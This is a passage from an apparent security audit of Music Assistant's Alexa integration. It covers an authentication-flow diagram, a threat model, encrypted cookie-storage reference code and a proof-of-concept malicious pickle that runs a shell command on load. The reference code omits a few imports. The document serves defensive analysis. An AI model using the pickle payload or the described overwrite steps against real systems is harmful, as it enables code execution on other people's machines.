3. **MEDIUM** (Backlog):
   - [ ] Create unit tests
   - [ ] Extract auth module
   - [ ] Add health monitoring

---

## 12. References

### Code Locations
- **Main Provider**: `server-2.6.0/music_assistant/providers/alexa/__init__.py`
- **Auth Helper**: `server-2.6.0/music_assistant/helpers/auth.py`
- **Manifest**: `server-2.6.0/music_assistant/providers/alexa/manifest.json`

### External Dependencies
- **alexapy**: v1.29.5 (PyPI: https://pypi.org/project/AlexaPy/)
- **alexapy docs**: https://alexapy.readthedocs.io/en/stable/
- **alexapy GitHub**: https://github.com/alandtse/alexapy

### Related Issues
- Alexa Media Player #2799: alexapy version availability
- Alexa Media Player #2418: CAPTCHA validation issues
- Alexa Media Player #1318: Cookie jar compatibility

---

## Appendix A: Authentication Flow Sequence Diagram

```
┌──────┐          ┌────────────┐       ┌───────────┐      ┌──────────┐      ┌────────┐
│ User │          │ MA Frontend│       │ MA Server │      │ alexapy  │      │ Amazon │
└──┬───┘          └─────┬──────┘       └─────┬─────┘      └────┬─────┘      └───┬────┘
   │                    │                    │                 │                 │
   │ 1. Configure Alexa │                    │                 │                 │
   ├───────────────────>│                    │                 │                 │
   │                    │                    │                 │                 │
   │                    │ 2. Collect Config  │                 │                 │
   │                    │ (email, password)  │                 │                 │
   │                    ├───────────────────>│                 │                 │
   │                    │                    │                 │                 │
   │                    │  3. "Authenticate" │                 │                 │
   │                    │     button clicked │                 │                 │
   │                    ├───────────────────>│                 │                 │
   │                    │                    │                 │                 │
   │                    │                    │ 4. Create       │                 │
   │                    │                    │    AlexaLogin   │                 │
   │                    │                    ├────────────────>│                 │
   │                    │                    │                 │                 │
   │                    │                    │ 5. Setup Proxy  │                 │
   │                    │                    │    (AlexaProxy) │                 │
   │                    │                    ├────────────────>│                 │
   │                    │                    │                 │                 │
   │                    │ 6. Redirect to     │                 │                 │
   │                    │<────proxy URL──────┤                 │                 │
   │                    │                    │                 │                 │
   │ 7. Open proxy URL  │                    │                 │                 │
   │<───────────────────┤                    │                 │                 │
   │                    │                    │                 │                 │
   │ 8. Load Amazon     │                    │                 │ 9. GET /signin  │
   │    login page      │                    │                 ├────────────────>│
   │<──────────────────────────────────────────────────────────────────────────┤
   │                    │                    │                 │                 │
   │ 10. Enter email,   │                    │                 │                 │
   │     password, 2FA  │                    │                 │ 11. POST /signin│
   ├─────────────────────────────────────────────────────────>│────────────────>│
   │                    │                    │                 │                 │
   │                    │                    │                 │ 12. Set cookies │
   │                    │                    │                 │    in session   │
   │                    │                    │                 │<────────────────┤
   │                    │                    │                 │                 │
   │                    │                    │ 13. Detect      │                 │
   │                    │                    │     "Successfully logged in"     │
   │<──Success page─────│<───────────────────┤<────────────────┤                 │
   │   "Close window"   │                    │                 │                 │
   │                    │                    │                 │                 │
   │                    │                    │ 14. Trigger     │                 │
   │                    │                    │     callback    │                 │
   │                    │                    │<────────────────┤                 │
   │                    │                    │                 │                 │
   │                    │                    │ 15. Test login  │                 │
   │                    │                    ├────────────────>│                 │
   │                    │                    │                 │ 16. Validate    │
   │                    │                    │                 ├────────────────>│
   │                    │                    │                 │<────OK──────────┤
   │                    │                    │<────success─────┤                 │
   │                    │                    │                 │                 │
   │                    │                    │ 17. Save cookies│                 │
   │                    │                    │     to pickle   │                 │
   │                    │                    │                 │                 │
   │                    │ 18. Config saved   │                 │                 │
   │                    │<───────────────────┤                 │                 │
   │<───Config done─────┤                    │                 │                 │
   │                    │                    │                 │                 │
   │                    │                    │ 19. Load devices│                 │
   │                    │                    ├────────────────>│                 │
   │                    │                    │                 │ 20. GET /devices│
   │                    │                    │                 ├────────────────>│
   │                    │                    │                 │<────list────────┤
   │                    │                    │<────devices─────┤                 │
   │                    │                    │                 │                 │
   │ 21. See Alexa      │                    │                 │                 │
   │     devices in MA  │                    │                 │                 │
   │<───────────────────┤                    │                 │                 │
```

---

## Appendix B: Threat Model

### Assets
1. **User Credentials**: Amazon email/password
2. **OTP Secret**: TOTP seed (more sensitive than password!)
3. **Session Cookies**: Long-lived access to Amazon account
4. **Music Assistant System**: Could be compromised via RCE

### Threat Actors
1. **Local Attacker**: Has read access to filesystem
2. **Network Attacker**: Can intercept HTTP traffic
3. **Malicious Software**: Running on same system as Music Assistant
4. **Remote Attacker**: If Music Assistant is exposed to internet

### Attack Scenarios

#### Scenario 1: Cookie Theft → Account Hijacking
```
1. Attacker gains read access to filesystem (e.g., misconfigured Docker volume)
2. Copies .alexa/*.pickle file
3. Deserializes cookie jar on attacker's machine
4. Uses cookies to authenticate to Amazon API
5. Can now control user's Alexa devices, view purchase history, etc.
```

**Likelihood**: HIGH (if MA exposed)
**Impact**: HIGH
**Mitigation**: Encrypt cookies at rest, restrict file permissions

---

#### Scenario 2: Pickle Deserialization → RCE
```
1. Attacker gains write access to .alexa/ directory
2. Crafts malicious pickle file (see Appendix D)
3. Overwrites legitimate cookie file
4. Music Assistant restarts and loads malicious pickle
5. Arbitrary code execution as Music Assistant user
6. Pivot to compromise entire system
```

**Likelihood**: MEDIUM (requires write access)
**Impact**: CRITICAL
**Mitigation**: Replace pickle with JSON, validate file integrity

---

#### Scenario 3: Memory Dump → Credential Exposure
```
1. Music Assistant crashes (e.g., OOM, segfault)
2. Core dump written to disk (if enabled)
3. Attacker analyzes core dump
4. Finds plaintext password and OTP secret in memory
5. Can now bypass 2FA indefinitely (OTP secret = all future codes)
```

**Likelihood**: LOW (requires crash + core dumps enabled)
**Impact**: CRITICAL
**Mitigation**: Clear credentials from memory after use, disable core dumps

---

#### Scenario 4: Amazon API Changes → Silent Auth Failure
```
1. Amazon changes login page HTML
2. "Successfully logged in" string no longer appears
3. Auth appears to succeed (no error thrown)
4. But cookies are invalid
5. API calls silently fail
6. User experience: "Alexa devices not working"
```

**Likelihood**: HIGH (historical precedent)
**Impact**: MEDIUM (availability, not security)
**Mitigation**: Robust success validation, fallback detection methods

---

## Appendix C: Secure Cookie Storage Reference Implementation

```python
"""Secure cookie storage for Alexa authentication.

Replaces insecure pickle format with encrypted JSON.
"""

import json
import os
from pathlib import Path
from typing import Optional

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
import aiofiles


class SecureCookieStorage:
    """Handles secure storage of Alexa session cookies."""

    def __init__(self, storage_path: Path, master_key: bytes):
        """
        Initialize secure cookie storage.

        Args:
            storage_path: Directory for cookie files (will create with 0700)
            master_key: Encryption key (32 bytes, from system keyring)
        """
        self.storage_path = storage_path
        self.fernet = Fernet(master_key)

        # Ensure directory exists with restrictive permissions
        self.storage_path.mkdir(mode=0o700, parents=True, exist_ok=True)

    def _get_cookie_path(self, username: str) -> Path:
        """Get path to cookie file for username."""
        # Sanitize username for filesystem
        safe_username = "".join(c for c in username if c.isalnum() or c in "._-@")
        return self.storage_path / f"alexa_session_{safe_username}.enc"

    async def save_cookies(self, username: str, cookies: dict) -> None:
        """
        Save cookies to encrypted file.

        Args:
            username: Amazon account email
            cookies: Dictionary of cookie data
        """
        cookie_path = self._get_cookie_path(username)

        # Serialize to JSON
        cookie_json = json.dumps(cookies, indent=2)

        # Encrypt
        encrypted = self.fernet.encrypt(cookie_json.encode())

        # Write atomically with restrictive permissions
        temp_path = cookie_path.with_suffix('.tmp')
        async with aiofiles.open(temp_path, 'wb') as f:
            await f.write(encrypted)

        # Set file permissions (owner read/write only)
        os.chmod(temp_path, 0o600)

        # Atomic rename
        temp_path.rename(cookie_path)

    async def load_cookies(self, username: str) -> Optional[dict]:
        """
        Load cookies from encrypted file.

        Args:
            username: Amazon account email

        Returns:
            Cookie dictionary or None if file doesn't exist
        """
        cookie_path = self._get_cookie_path(username)

        if not cookie_path.exists():
            return None

        # Verify file permissions (paranoid check)
        stat_info = cookie_path.stat()
        if stat_info.st_mode & 0o077:  # Check if group/other have any permissions
            raise SecurityError(f"Cookie file {cookie_path} has insecure permissions")

        # Read encrypted data
        async with aiofiles.open(cookie_path, 'rb') as f:
            encrypted = await f.read()

        # Decrypt
        try:
            decrypted = self.fernet.decrypt(encrypted)
        except Exception as e:
            raise SecurityError(f"Failed to decrypt cookie file: {e}")

        # Parse JSON
        try:
            return json.loads(decrypted)
        except json.JSONDecodeError as e:
            raise SecurityError(f"Corrupted cookie file: {e}")

    async def delete_cookies(self, username: str) -> None:
        """
        Securely delete cookie file.

        Args:
            username: Amazon account email
        """
        cookie_path = self._get_cookie_path(username)

        if cookie_path.exists():
            # Overwrite with random data before deletion (defense in depth)
            file_size = cookie_path.stat().st_size
            async with aiofiles.open(cookie_path, 'wb') as f:
                await f.write(os.urandom(file_size))

            cookie_path.unlink()


class SecurityError(Exception):
    """Raised when security validation fails."""
    pass


# Usage in alexa/__init__.py:

async def save_cookie(login: AlexaLogin, username: str, mass: MusicAssistant) -> None:
    """Save cookies using secure storage."""
    # Get master key from config (generated once, stored in system keyring)
    master_key = await get_or_create_encryption_key(mass)

    storage = SecureCookieStorage(
        storage_path=Path(mass.storage_path) / ".alexa",
        master_key=master_key
    )

    # Extract cookies from alexapy session
    cookie_jar = login._session.cookie_jar
    cookie_dict = {
        'cookies': [
            {
                'name': c.key,
                'value': c.value,
                'domain': c['domain'],
                'path': c['path'],
                'secure': c.get('secure', False),
                'expires': c.get('expires', None),
            }
            for c in cookie_jar
        ],
        'timestamp': time.time(),
    }

    await storage.save_cookies(username, cookie_dict)


async def get_or_create_encryption_key(mass: MusicAssistant) -> bytes:
    """
    Get or create master encryption key for cookie storage.

    Key hierarchy:
    1. Try to load from system keyring (production)
    2. Fall back to config file (development)
    3. Generate new key if neither exists
    """
    try:
        import keyring
        key_b64 = keyring.get_password("music_assistant", "alexa_cookie_key")
        if key_b64:
            return base64.urlsafe_b64decode(key_b64)
    except ImportError:
        pass  # keyring not available

    # Fall back to config file
    key_file = Path(mass.storage_path) / ".alexa" / "encryption_key"
    if key_file.exists():
        return key_file.read_bytes()

    # Generate new key
    key = Fernet.generate_key()

    # Try to save to keyring
    try:
        import keyring
        keyring.set_password("music_assistant", "alexa_cookie_key",
                             base64.urlsafe_b64encode(key).decode())
    except ImportError:
        # Save to file with restrictive permissions
        key_file.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
        key_file.write_bytes(key)
        os.chmod(key_file, 0o600)

    return key
```

---

## Appendix D: Malicious Pickle Example (For Reference Only)

**⚠️ WARNING**: This is for educational purposes only. DO NOT use maliciously.

```python
"""
Demonstration of pickle deserialization vulnerability.

This shows why using pickle for untrusted data is dangerous.
"""

import pickle
import os


class MaliciousPayload:
    """Object that executes code when unpickled."""

    def __reduce__(self):
        # This function is called during pickling
        # Return (callable, args) that will be called during unpickling
        # Here: os.system('evil command')
        return (os.system, ('echo "Arbitrary code execution!" > /tmp/pwned',))


# Create malicious pickle file
with open('malicious_cookie.pickle', 'wb') as f:
    pickle.dump(MaliciousPayload(), f)

# When this file is loaded:
with open('malicious_cookie.pickle', 'rb') as f:
    pickle.load(f)  # Executes: echo "Arbitrary code execution!" > /tmp/pwned

# Result: /tmp/pwned file is created WITHOUT any function call
```

**How it exploits Alexa provider**:
1. Attacker overwrites `~/.local/share/music_assistant/.alexa/alexa_media.victim@example.com.pickle`
2. Music Assistant restarts
3. `loaded_in_mass()` calls `login.load_cookie()`
4. alexapy deserializes pickle file
5. **Arbitrary code execution** as Music Assistant user

**Mitigation**: Never use pickle for data that could be modified by untrusted parties.

---

## Appendix E: Glossary

- **2FA**: Two-Factor Authentication
- **CAPTCHA**: Completely Automated Public Turing test to tell Computers and Humans Apart
- **CSRF**: Cross-Site Request Forgery
- **HOTP**: HMAC-Based One-Time Password (event-based)
- **OAuth2**: Industry-standard authorization protocol
- **OTP**: One-Time Password
- **Pickle**: Python's native serialization format (insecure for untrusted data)
- **RCE**: Remote Code Execution
- **TOTP**: Time-Based One-Time Password (time-based, used by Google Authenticator)
- **Umask**: Unix file creation mask (default permissions for new files)

---

## Document Metadata

**Author**: Claude Code (Sonnet 4.5)
**Analysis Date**: 2025-10-25
**Code Version**: Music Assistant 2.6.0
**alexapy Version**: 1.29.5
**Severity**: 🔴 HIGH RISK
**Recommendation**: ⚠️ Security hardening required before production use

**Change Log**:
- 2025-10-25: Initial deep analysis (8 critical issues, 6 fragility points identified)

---

**End of Analysis**
